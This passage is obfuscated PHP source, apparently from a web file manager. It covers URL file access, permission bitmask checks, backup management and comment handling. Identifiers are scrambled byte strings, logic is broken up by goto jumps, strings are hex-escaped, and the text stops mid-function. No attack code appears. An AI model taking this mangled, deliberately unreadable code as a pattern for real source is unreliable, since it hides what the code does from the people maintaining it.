$DÈÊ‚–Í  = array($c¾ÑÄ©Ñ¤æ[29] => isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1353]]) ? $FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1353]] : null, $c¾ÑÄ©Ñ¤æ[78] => isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1354]]) ? $FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1354]] : null, $c¾ÑÄ©Ñ¤æ[207] => isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1355]]) ? $FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1355]] : null, $c¾ÑÄ©Ñ¤æ[1322] => isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1356]]) ? $FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1356]] : null); $DÈÊ‚–Í [$c¾ÑÄ©Ñ¤æ[1323]] = isset($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1357]]) ? strtotime($FæƒÕšæ´[$c¾ÑÄ©Ñ¤æ[1357]]) : $DÈÊ‚–Í [$c¾ÑÄ©Ñ¤æ[1322]]; return $DÈÊ‚–Í ; goto d¤‹Ô”°ó; F«Ìµ¹ª¢ó: $c¾ÑÄ©Ñ¤æ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($câ„ÄçÀ¥ƒ == $c¾ÑÄ©Ñ¤æ[33] || $câ„ÄçÀ¥ƒ == $c¾ÑÄ©Ñ¤æ[8]) { return array(); } $EïÑíÁ‰œª = $this->ussRequest($câ„ÄçÀ¥ƒ, $c¾ÑÄ©Ñ¤æ[1352]); goto D××š‘³‘ù; d¤‹Ô”°ó: } protected function _isFolder($Dá‘øƒãÈŒ) { $fĞøß‰õá– =& $_SERVER[Ïº«‚ßèÔˆø]; if ($Dá‘øƒãÈŒ == $fĞøß‰õá–[33] || $Dá‘øƒãÈŒ == $fĞøß‰õá–[8]) { return !0; } $C‚¬‰İ’° = $this->_objectMeta($Dá‘øƒãÈŒ); return isset($C‚¬‰İ’°[$fĞøß‰õá–[29]]) && $C‚¬‰İ’°[$fĞøß‰õá–[29]] == $fĞøß‰õá–[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($D»¿ÆÁ‚ñÈ = false) { } public function exist($c´ƒ†îæ¥˜) { $d•¹Ş´‘™¶ = $this->info($c´ƒ†îæ¥˜); return $d•¹Ş´‘™¶[$_SERVER[Ïº«‚ßèÔˆø][194]]; } public function isFile($BÚËŸœ¸Áì) { $BŠç ŠŒç = $this->info($BÚËŸœ¸Áì); return $BŠç ŠŒç[$_SERVER[Ïº«‚ßèÔˆø][194]]; } public function isFolder($D›ŞÑÄÏÙÉ) { return !1; } public function size($Eôí•ŠÓ‡À) { $AëãÆ‘…õ– = $this->info($Eôí•ŠÓ‡À); return $AëãÆ‘…õ–[$_SERVER[Ïº«‚ßèÔˆø][78]]; } public function info($B‹±Œ¯ÏÔ°) { return $this->infoParse($B‹±Œ¯ÏÔ°); } public function infoAuth($fÈĞİÜ¡‡š) { return $this->infoParse($fÈĞİÜ¡‡š); } public function infoWithChildren($Bšˆˆ¸ŸÀ„) { return $this->infoParse($Bšˆˆ¸ŸÀ„); } public function infoFull($Eƒœ¨‹ÔÓØ) { return $this->infoParse($Eƒœ¨‹ÔÓØ); } private function infoParse($BŒ¦Óâ´§Ï) { $dÏÁÑêè =& $_SERVER[Ïº«‚ßèÔˆø]; $Fç´³ƒùŒ½ = $this->header($BŒ¦Óâ´§Ï); if (!$Fç´³ƒùŒ½ || !$Fç´³ƒùŒ½[$dÏÁÑêè[697]]) { return !1; } $cÙ‹×ØË¨ = _get($Fç´³ƒùŒ½, $dÏÁÑêè[334], 0); $c·ÚÙ­è‹‡ = array($dÏÁÑêè[28] => $Fç´³ƒùŒ½[$dÏÁÑêè[28]], $dÏÁÑêè[76] => $BŒ¦Óâ´§Ï, $dÏÁÑêè[29] => $dÏÁÑêè[192], $dÏÁÑêè[78] => intval($cÙ‹×ØË¨), $dÏÁÑêè[168] => get_path_ext($Fç´³ƒùŒ½[$dÏÁÑêè[28]]), $dÏÁÑêè[1237] => $cÙ‹×ØË¨ > 0 && $Fç´³ƒùŒ½[$dÏÁÑêè[1358]], $dÏÁÑêè[1238] => !1); return $c·ÚÙ­è‹‡; } private function header($BÎŠ­ªÅ©˜) { goto B¥ÁçÜ£ŠŒ; AéÎÑ“íÖ: $GLOBALS[$A¶è¤Ğ¸¢¬[1359]] = !0; self::$_cacheHeader[$BÎŠ­ªÅ©˜] = url_header($BÎŠ­ªÅ©˜); $GLOBALS[$A¶è¤Ğ¸¢¬[1359]] = $c‘®¬Åóß¾; goto cÏ÷¡ĞöÈŒ; B¥ÁçÜ£ŠŒ: $A¶è¤Ğ¸¢¬ =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset(self::$_cacheHeader[$BÎŠ­ªÅ©˜])) { return self::$_cacheHeader[$BÎŠ­ªÅ©˜]; } $c‘®¬Åóß¾ = isset($GLOBALS[$A¶è¤Ğ¸¢¬[1359]]) ? $GLOBALS[$A¶è¤Ğ¸¢¬[1359]] : !1; goto AéÎÑ“íÖ; cÏ÷¡ĞöÈŒ: return self::$_cacheHeader[$BÎŠ­ªÅ©˜]; goto BÔ¾Ø ÖŸ; BÔ¾Ø ÖŸ: } public function hashSimple($aÑœßßùÒÏ, $D¿†Èä–¢ = false) { goto bªñôÎ’±‘; dôˆ¦‘Îê†: $aâ÷óé = $B¬×¤†¿¹¦[$cãøËî»Û[78]]; $Aù§ÚëìÓ = 200; $D¸‡Àà–â = 50; goto D›œ¶ì®ñ; bªñôÎ’±‘: $cãøËî»Û =& $_SERVER[Ïº«‚ßèÔˆø]; $B¬×¤†¿¹¦ = $this->info($aÑœßßùÒÏ); if (!$B¬×¤†¿¹¦ || !$B¬×¤†¿¹¦[$cãøËî»Û[194]]) { return !1; } goto dôˆ¦‘Îê†; D›œ¶ì®ñ: if ($aâ÷óé <= $Aù§ÚëìÓ * $D¸‡Àà–â) { return md5($this->fileSubstr($aÑœßßùÒÏ, 0, $aâ÷óé)) . $aâ÷óé; } $eÇĞ¨—º†Ä = intval($aâ÷óé / $D¸‡Àà–â); $CÕÙÊ«‡Ãç = $cãøËî»Û[33]; goto e‹’Ä¬²Ÿæ; eâ†–›ÌË¢: $CÕÙÊ«‡Ãç .= $this->fileSubstr($aÑœßßùÒÏ, $aâ÷óé - $Aù§ÚëìÓ, $Aù§ÚëìÓ); return md5($CÕÙÊ«‡Ãç) . $aâ÷óé; goto A—´¨§ˆàó; e‹’Ä¬²Ÿæ: $E†à·ùò•ê = timeFloat(); $aœ¾…‚ë¿« = 15; for ($A‘ÊºÄØµŒ = 0; $A‘ÊºÄØµŒ < $D¸‡Àà–â; $A‘ÊºÄØµŒ++) { if (timeFloat() - $E†à·ùò•ê > $aœ¾…‚ë¿«) { return !1; } $AÊàì¬ = $this->fileSubstr($aÑœßßùÒÏ, $eÇĞ¨—º†Ä * $A‘ÊºÄØµŒ, $Aù§ÚëìÓ); if (!$AÊàì¬) { return !1; } $CÕÙÊ«‡Ãç .= $AÊàì¬; } goto eâ†–›ÌË¢; A—´¨§ˆàó: } public function getContent($DÁìÓŞ”§Ù) { return $this->fileSubstr($DÁìÓŞ”§Ù); } public function fileSubstr($fßó›ŠÉŒÉ, $B¬“çíÜ‡¼ = 0, $DÕ™¨°ŸŠÛ = -1) { goto Bä¾†¡Ø´Œ; Bä¾†¡Ø´Œ: $c¤é„¥ØóÂ =& $_SERVER[Ïº«‚ßèÔˆø]; $E†ÌŠÈš»‘ = $this->info($fßó›ŠÉŒÉ); if (!$E†ÌŠÈš»‘ || !$E†ÌŠÈš»‘[$c¤é„¥ØóÂ[194]] && $E†ÌŠÈš»‘[$c¤é„¥ØóÂ[78]] > 1024 * 1024 * 10) { return !1; } goto DèéÜà ½; a­‘“²µË: $DÂÄ½—“Û = url_request($fßó›ŠÉŒÉ, $c¤é„¥ØóÂ[227], !1, $Bøºá­“Èó, !1, !1, 1); return $DÂÄ½—“Û[$c¤é„¥ØóÂ[1071]] ? $DÂÄ½—“Û[$c¤é„¥ØóÂ[1071]] : $c¤é„¥ØóÂ[33]; goto e‘”ãÂè·; DèéÜà ½: if ($DÕ™¨°ŸŠÛ === -1) { $DÕ™¨°ŸŠÛ = $E†ÌŠÈš»‘[$c¤é„¥ØóÂ[78]]; } if ($DÕ™¨°ŸŠÛ == 0) { return $c¤é„¥ØóÂ[33]; } $Bøºá­“Èó = array($c¤é„¥ØóÂ[1360] . $B¬“çíÜ‡¼ . $c¤é„¥ØóÂ[728] . ($B¬“çíÜ‡¼ + $DÕ™¨°ŸŠÛ - 1)); goto a­‘“²µË; e‘”ãÂè·: } public function download($e†Ù¬ÅÑÃì, $Eç…±Ñ·Ğ™) { Downloader::start($e†Ù¬ÅÑÃì, $Eç…±Ñ·Ğ™); return $Eç…±Ñ·Ğ™; } } goto c¦‚µ ã¿; A¼ ĞíìÁ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $dè Ï¶©Æµ =& $_SERVER[Ïº«‚ßèÔˆø]; $cèîÓÀíºÕ = array(array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1672]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1674], $dè Ï¶©Æµ[1675] => 1, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1678]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1679], $dè Ï¶©Æµ[1675] => 2, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1680]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1681], $dè Ï¶©Æµ[1675] => 3, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1682]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1683], $dè Ï¶©Æµ[1675] => 4, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_VIEW), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1684]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1685], $dè Ï¶©Æµ[1675] => 5, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1686]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1687], $dè Ï¶©Æµ[1675] => 6, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($dè Ï¶©Æµ[411] => LNG($dè Ï¶©Æµ[1688]), $dè Ï¶©Æµ[1673] => $dè Ï¶©Æµ[1689], $dè Ï¶©Æµ[1675] => 7, $dè Ï¶©Æµ[1676] => 1, $dè Ï¶©Æµ[1677] => 0)); return $cèîÓÀíºÕ; } public static function authCheck($dôëšàÊíÂ, $BìËµíèš) { $dôëšàÊíÂ = intval($dôëšàÊíÂ); if ($GLOBALS[$_SERVER[Ïº«‚ßèÔˆø][483]]) { return !0; } if ($dôëšàÊíÂ <= 0) { return !1; } if (($dôëšàÊíÂ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dôëšàÊíÂ & $BìËµíèš); } public static function authCheckShow($C‹µè„¡Ì) { return self::authCheck($C‹µè„¡Ì, self::AUTH_SHOW); } public static function authCheckView($Eôù…•°ƒ) { return self::authCheck($Eôù…•°ƒ, self::AUTH_VIEW); } public static function authCheckDownload($A ÂÜ¬—®‘) { return self::authCheck($A ÂÜ¬—®‘, self::AUTH_DOWNLOAD); } public static function authCheckUpload($D´ÁÚÈ) { return self::authCheck($D´ÁÚÈ, self::AUTH_UPLOAD); } public static function authCheckEdit($CÜØâ“Š›) { return self::authCheck($CÜØâ“Š›, self::AUTH_EDIT); } public static function authCheckRemove($cäÛ¾îö) { return self::authCheck($cäÛ¾îö, self::AUTH_REMOVE); } public static function authCheckShare($c‹³ ùˆ°ñ) { return self::authCheck($c‹³ ùˆ°ñ, self::AUTH_SHARE); } public static function authCheckComment($cÇ¥ÚÅĞÀ³) { return self::authCheck($cÇ¥ÚÅĞÀ³, self::AUTH_COMMENT); } public static function authCheckEvent($aÊª÷ÑíÉñ) { return self::authCheck($aÊª÷ÑíÉñ, self::AUTH_EVENT); } public static function authCheckRoot($EŠÉí‡Ú–¸) { return self::authCheck($EŠÉí‡Ú–¸, self::AUTH_ROOT); } public static function authCheckAction($E‹ÖæÇäÅ, $bßêö¢×º¼) { goto dòªÄÖïš÷; AÔÇ¡¿Ô·‰: $dÏ´ÍùçÙå = $A„¨Ó­¹ÃÈ[$bßêö¢×º¼]; $E‹ÖæÇäÅ = intval($E‹ÖæÇäÅ); if ($E‹ÖæÇäÅ <= 0) { return !1; } goto fƒğÑÌ§À¿; fƒğÑÌ§À¿: if (($E‹ÖæÇäÅ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($E‹ÖæÇäÅ & $dÏ´ÍùçÙå); goto A»‚“‰†‚; dòªÄÖïš÷: $D´Ü‘êÌÎ¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $A„¨Ó­¹ÃÈ = array($D´Ü‘êÌÎ¦[1690] => self::AUTH_VIEW, $D´Ü‘êÌÎ¦[1077] => self::AUTH_DOWNLOAD, $D´Ü‘êÌÎ¦[107] => self::AUTH_UPLOAD, $D´Ü‘êÌÎ¦[1638] => self::AUTH_EDIT, $D´Ü‘êÌÎ¦[1637] => self::AUTH_REMOVE, $D´Ü‘êÌÎ¦[1648] => self::AUTH_SHARE, $D´Ü‘êÌÎ¦[351] => self::AUTH_COMMENT, $D´Ü‘êÌÎ¦[1497] => self::AUTH_EVENT, $D´Ü‘êÌÎ¦[1691] => self::AUTH_ROOT); if (!isset($A„¨Ó­¹ÃÈ[$bßêö¢×º¼])) { return; } goto AÔÇ¡¿Ô·‰; A»‚“‰†‚: } public static function authDisable($dÀñéÑ›Îè, $c²“Ó‘÷©½) { if (intval($dÀñéÑ›Îè) <= 0) { return 0; } return intval($dÀñéÑ›Îè) & ~$c²“Ó‘÷©½; } public $optionType = "\x53\x79\163\164\145\x6d\x2e\x73\157\x75\162\x63\145\x41\165\x74\150\x4c\x69\163\x74"; public $field = array("\x6e\141\155\x65", "\x61\165\x74\150", "\x6c\x61\x62\x65\154", "\144\x69\x73\x70\x6c\x61\171", "\x73\171\163\164\145\x6d", "\x73\157\162\x74"); public function initData() { $AÜçÜ–ƒè® = $this->authDefault(); foreach ($AÜçÜ–ƒè® as $A´Ùö¹®’—) { $this->add($A´Ùö¹®’—); } } public function listData($C’â§ñÚßÇ = false, $f´äÀ¯‚¡‡ = "\x73\x6f\162\164", $Aªò¢çÍ³ = false) { return parent::listData($C’â§ñÚßÇ, $f´äÀ¯‚¡‡, $Aªò¢çÍ³); } public function update($DŠÏ§ù›, $f©øº³Ã¬Å) { $AÕÚã‰ëè =& $_SERVER[Ïº«‚ßèÔˆø]; $f¬¡×–“ˆè = parent::listData($DŠÏ§ù›); $fÀ´Ãõ¿æ = $this->findByName($f©øº³Ã¬Å[$AÕÚã‰ëè[28]]); if (!$f¬¡×–“ˆè || $fÀ´Ãõ¿æ && $fÀ´Ãõ¿æ[$AÕÚã‰ëè[392]] != $f¬¡×–“ˆè[$AÕÚã‰ëè[392]]) { return !1; } $this->filterAuth($f©øº³Ã¬Å[$AÕÚã‰ëè[404]]); return parent::update($DŠÏ§ù›, $f©øº³Ã¬Å); } public function remove($dùÁ§¶˜Ê÷) { $bç”¥”ƒæ˜ = parent::listData($dùÁ§¶˜Ê÷); if (!$bç”¥”ƒæ˜ || $bç”¥”ƒæ˜[$_SERVER[Ïº«‚ßèÔˆø][1152]]) { return !1; } return parent::remove($dùÁ§¶˜Ê÷); } public function add($DÕÄë×¬©» = array()) { goto aŒ†¼õ‘Ö; FÇßĞªºÀñ: return parent::insert($DÕÄë×¬©»); goto cå²ÓĞÎˆ; A‡“­‚„î: $DÕÄë×¬©» = array_merge($bŒ©›ğÔ¯³, $DÕÄë×¬©»); $DÕÄë×¬©»[$bÎì¬ƒÂò[1694]] = $this->getSort(); $this->filterAuth($DÕÄë×¬©»[$bÎì¬ƒÂò[404]]); goto FÇßĞªºÀñ; aŒ†¼õ‘Ö: $bÎì¬ƒÂò =& $_SERVER[Ïº«‚ßèÔˆø]; if ($this->findByName($DÕÄë×¬©»[$bÎì¬ƒÂò[28]])) { return !1; } $bŒ©›ğÔ¯³ = array($bÎì¬ƒÂò[28] => $bÎì¬ƒÂò[33], $bÎì¬ƒÂò[404] => 1, $bÎì¬ƒÂò[1692] => $bÎì¬ƒÂò[1681], $bÎì¬ƒÂò[1693] => 1, $bÎì¬ƒÂò[1152] => 0, $bÎì¬ƒÂò[1694] => 0); goto A‡“­‚„î; cå²ÓĞÎˆ: } private function getSort() { $fÏËÂ—¹ñ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÏ±°òÊ„ = parent::listData(); $eíÇµ©ÚĞê = array_to_keyvalue($fÏ±°òÊ„, $fÏËÂ—¹ñ[33], $fÏËÂ—¹ñ[1694]); return empty($eíÇµ©ÚĞê) ? 0 : max($eíÇµ©ÚĞê) + 1; } private function filterAuth(&$dâíô¤Ç©Ã) { goto DÕÌ‡¡›‹Š; F×—²²Ï©‘: foreach ($C©‘®´Ï‡ as $E‡ˆêÆ°š—) { if (isset($BÌ“õ·[$E‡ˆêÆ°š—])) { $C©‘®´Ï‡ = array_merge($C©‘®´Ï‡, $BÌ“õ·[$E‡ˆêÆ°š—]); } } $C©‘®´Ï‡[] = self::AUTH_SHOW; $dâíô¤Ç©Ã = array_sum(array_unique($C©‘®´Ï‡)); goto aøªÀ„µÒÍ; B‘ÈÆÄº¤ã: foreach ($cí‡Îáğ² as $E‡ˆêÆ°š—) { if ($dâíô¤Ç©Ã & $E‡ˆêÆ°š—) { $C©‘®´Ï‡[] = $E‡ˆêÆ°š—; } } if (in_array(self::AUTH_ROOT, $C©‘®´Ï‡)) { $dâíô¤Ç©Ã = array_sum($cí‡Îáğ²); return; } $BÌ“õ· = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto F×—²²Ï©‘; DÕÌ‡¡›‹Š: if (!$dâíô¤Ç©Ã) { return; } $cí‡Îáğ² = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $C©‘®´Ï‡ = array(); goto B‘ÈÆÄº¤ã; aøªÀ„µÒÍ: } public function sort($a·££Ó½É™, $cŸÒ§ãÓÁŞ) { return parent::update($a·££Ó½É™, $cŸÒ§ãÓÁŞ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\x62\x61\143\x6b\x75\x70\114\151\x73\x74"; public $field = array("\x69\x6f", "\156\141\155\x65", "\x73\164\141\164\x75\163", "\x63\157\156\x74\145\156\x74", "\x72\145\163\x75\154\164", "\164\151\x6d\145\x46\162\x6f\x6d", "\x74\151\155\x65\124\157"); public function config() { goto E£äæÍ“Ùˆ; aÉµ»ã”Û”: $DŞ·°××ÑĞ = is_array($DŞ·°××ÑĞ) ? $DŞ·°××ÑĞ : array(); if (!isset($DŞ·°××ÑĞ[$aº…ªµô¯æ[700]])) { $DŞ·°××ÑĞ[$aº…ªµô¯æ[700]] = $aº…ªµô¯æ[87]; } $BÕ©´ñæÄï = array(); goto f¿Ëƒ®ÌÚœ; E£äæÍ“Ùˆ: $aº…ªµô¯æ =& $_SERVER[Ïº«‚ßèÔˆø]; $DŞ·°××ÑĞ = Model($aº…ªµô¯æ[714])->get($aº…ªµô¯æ[726]); $DŞ·°××ÑĞ = json_decode($DŞ·°××ÑĞ, !0); goto aÉµ»ã”Û”; bìºÒª†® : if (isset($BÕ©´ñæÄï[$aº…ªµô¯æ[196]])) { $BÕ©´ñæÄï[$aº…ªµô¯æ[196]] = json_decode($BÕ©´ñæÄï[$aº…ªµô¯æ[196]], !0); } if (isset($DŞ·°××ÑĞ[$aº…ªµô¯æ[196]])) { $BÕ©´ñæÄï[$aº…ªµô¯æ[196]][$aº…ªµô¯æ[1482]] = $DŞ·°××ÑĞ[$aº…ªµô¯æ[196]]; unset($DŞ·°××ÑĞ[$aº…ªµô¯æ[196]]); } return array_merge($BÕ©´ñæÄï, $DŞ·°××ÑĞ); goto b¥÷Ó¿¤ÁÂ; f¿Ëƒ®ÌÚœ: Action($aº…ªµô¯æ[1695])->taskInit(); $D‹Îİ±ÀÁÛ = Model($aº…ªµô¯æ[1696])->listData(); foreach ($D‹Îİ±ÀÁÛ as $E‰Àïš¦¦Ü) { if ($E‰Àïš¦¦Ü[$aº…ªµô¯æ[1152]] == $aº…ªµô¯æ[87] && $E‰Àïš¦¦Ü[$aº…ªµô¯æ[1497]] == $aº…ªµô¯æ[1697]) { $BÕ©´ñæÄï = $E‰Àïš¦¦Ü; break; } } goto bìºÒª†® ; b¥÷Ó¿¤ÁÂ: } public function listData($a–—ÕÑ¸ëÀ = false, $D”î·ÈŞ÷Á = "\x6d\157\144\151\x66\x79\x54\x69\155\145", $B¨ØˆìÕóÌ = false) { return parent::listData($a–—ÕÑ¸ëÀ, $D”î·ÈŞ÷Á, !0); } public function lastItem() { $Bª´¸òÒ÷¶ = $this->listData(); return !empty($Bª´¸òÒ÷¶[0]) ? $Bª´¸òÒ÷¶[0] : null; } public function kill($bó¦–óéÈ) { goto Eö¦÷´ìÇ™; Eö¦÷´ìÇ™: $båÎ‹É¥ô· =& $_SERVER[Ïº«‚ßèÔˆø]; $bíù·¨³àÒ = $this->listData($bó¦–óéÈ); if (!$bíù·¨³àÒ || empty($bíù·¨³àÒ[$båÎ‹É¥ô·[28]])) { return !0; } goto fÒÎòÎ½ÕÎ; fÒÎòÎ½ÕÎ: Task::kill($båÎ‹É¥ô·[725]); Task::kill($båÎ‹É¥ô·[756]); Task::kill($båÎ‹É¥ô·[766]); goto C‚£“ìªØ¸; e†ÎÁÙ‚ï: return $this->remove($bó¦–óéÈ); goto b”•æ„ÔÆ˜; C‚£“ìªØ¸: $FöÎÍ„³Ü¥ = $bíù·¨³àÒ[$båÎ‹É¥ô·[28]]; $CêÉµÃÉ = TEMP_FILES . $båÎ‹É¥ô·[722] . $FöÎÍ„³Ü¥ . $båÎ‹É¥ô·[8]; IO::remove($CêÉµÃÉ, !1); goto e†ÎÁÙ‚ï; b”•æ„ÔÆ˜: } public function remove($bŒ•´´ğ÷) { $BäÉ¾†ËÛ = $this->listData($bŒ•´´ğ÷); if (!$BäÉ¾†ËÛ) { return !0; } return $this->backupRemove($BäÉ¾†ËÛ); } private function backupRemove($e¢ÂƒÂøèË) { parent::remove($e¢ÂƒÂøèË[$_SERVER[Ïº«‚ßèÔˆø][392]]); $Dù¤Ï‚Ãƒ£ = $this->backupPath($e¢ÂƒÂøèË); IO::remove($Dù¤Ï‚Ãƒ£, !1); return !0; } private function backupPath($eí®Ğê§¿) { $båËšêƒ¶‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $fö‡İ‹Í¢‰ = $eí®Ğê§¿[$båËšêƒ¶‘[28]]; $Cñ¦Ô­Öğ½ = Model($båËšêƒ¶‘[714])->get($båËšêƒ¶‘[715]); $bØÒŸ¸­´ = substr(md5($båËšêƒ¶‘[716] . $Cñ¦Ô­Öğ½ . $fö‡İ‹Í¢‰), 0, 8); return "\x7b\x69\x6f\x3a{$eí®Ğê§¿[$båËšêƒ¶‘[699]]}\175\57\144\141\164\141\x62\141\163\x65\57\142\x61\x63\x6b\x75\x70\57" . $fö‡İ‹Í¢‰ . $båËšêƒ¶‘[71] . $bØÒŸ¸­´; } public function start() { goto aæÚ­çòò; d¾òÑ¹ï¢µ: if (!$aâõ‡ÏÍ¼§ || $aâõ‡ÏÍ¼§[$A’å‰àŸ–•[1479]] != $A’å‰àŸ–•[87]) { return !1; } $c„ÍˆÂ…öá = $this->process(); foreach ($c„ÍˆÂ…öá as $D¯›İöÖÆÔ) { if ($D¯›İöÖÆÔ) { return Task::restart($D¯›İöÖÆÔ[$A’å‰àŸ–•[392]]); } } goto Aã¬´‡¥»ê; aæÚ­çòò: $A’å‰àŸ–• =& $_SERVER[Ïº«‚ßèÔˆø]; if ($GLOBALS[$A’å‰àŸ–•[6]][$A’å‰àŸ–•[88]][$A’å‰àŸ–•[1698]] != $A’å‰àŸ–•[87]) { return !0; } $aâõ‡ÏÍ¼§ = $this->config(); goto d¾òÑ¹ï¢µ; Aã¬´‡¥»ê: $b¼‘‡ª®Æˆ = new Backup(); $b¼‘‡ª®Æˆ->keep(); $BÉöƒ°¶’ = $b¼‘‡ª®Æˆ->db(); goto A³¹®Üéš†; A³¹®Üéš†: if ($BÉöƒ°¶’) { $BÉöƒ°¶’ = $b¼‘‡ª®Æˆ->dbFile(); if ($BÉöƒ°¶’ && $aâõ‡ÏÍ¼§[$A’å‰àŸ–•[700]] == $A’å‰àŸ–•[495]) { $BÉöƒ°¶’ = $b¼‘‡ª®Æˆ->file(); } } Backup::set(array($A’å‰àŸ–•[697] => 1, $A’å‰àŸ–•[474] => time())); return !0; goto aãçòá¢„á; aãçòá¢„á: } public function process() { $fÁ¯¹§ä—¿ =& $_SERVER[Ïº«‚ßèÔˆø]; return array($fÁ¯¹§ä—¿[702] => Task::get($fÁ¯¹§ä—¿[725]), $fÁ¯¹§ä—¿[706] => Task::get($fÁ¯¹§ä—¿[756]), $fÁ¯¹§ä—¿[192] => Task::get($fÁ¯¹§ä—¿[766])); } public function restore() { $eöëò¼†ƒÅ =& $_SERVER[Ïº«‚ßèÔˆø]; ActionCall($eöëò¼†ƒÅ[1002], !0, 1); ActionCall($eöëò¼†ƒÅ[1002], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\x65\x6e\164"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\145" => "\143\x6f\155\155\x65\x6e\x74\x5f\x6d\145\x74\x61", "\155\145\164\141\x46\151\x65\x6c\144" => "\143\x6f\155\x6d\145\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($E ÇÁª¼™) { $eÇô¿Ïä†ß =& $_SERVER[Ïº«‚ßèÔˆø]; if ($E ÇÁª¼™[$eÇô¿Ïä†ß[1699]]) { $eÄ¶—Ğ †  = $this->where(array($eÇô¿Ïä†ß[1700] => $E ÇÁª¼™[$eÇô¿Ïä†ß[1699]]))->find(); if (!$eÄ¶—Ğ †  || $eÄ¶—Ğ † [$eÇô¿Ïä†ß[402]] != $E ÇÁª¼™[$eÇô¿Ïä†ß[402]] || $eÄ¶—Ğ † [$eÇô¿Ïä†ß[482]] != $E ÇÁª¼™[$eÇô¿Ïä†ß[482]]) { return !1; } $this->where(array($eÇô¿Ïä†ß[1700] => $E ÇÁª¼™[$eÇô¿Ïä†ß[1699]]))->setAdd($eÇô¿Ïä†ß[1701], 1); } $E ÇÁª¼™[$eÇô¿Ïä†ß[1702]] = 0; $E ÇÁª¼™[$eÇô¿Ïä†ß[1701]] = 0; $E ÇÁª¼™[$eÇô¿Ïä†ß[697]] = 1; return $this->add($E ÇÁª¼™); } public function commentCount($eÅ‹ØåÏ‘ò, $c˜­Êã¡¾Å) { goto dÇããÈİÄ; A‘ÀÃö£ˆÌ: $DšÒë–à¦ = array($bñ‡ˆòõ©[482], $bñ‡ˆòõ©[1703] => $bñ‡ˆòõ©[478]); 